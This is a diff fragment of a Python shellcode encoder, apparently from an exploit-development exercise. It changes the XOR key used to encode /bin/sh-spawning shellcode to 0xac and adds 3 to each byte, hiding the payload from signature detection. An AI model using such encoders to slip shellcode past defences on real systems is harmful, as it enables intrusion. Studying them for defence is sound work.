@@ -4,16 +4,16 @@ shellcode = ("\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x
 
 encoded = ""
 encoded2 = ""
-xor = 5
+xor = 0xac
 
-# XOR every byte with 5 and after that add 3 to every byte
+# XOR every byte with 0xac and after that add 3 to every byte
 
 for x in bytearray(shellcode):
 
-# XOR every byte with 5
+# XOR every byte with 0xac
 	byte = x ^ xor
 
-# Add 33 to every byte
+# Add 3 to every byte
 	encoded += '\\x'
 	encoded += '%02x' % (byte + 3)
 
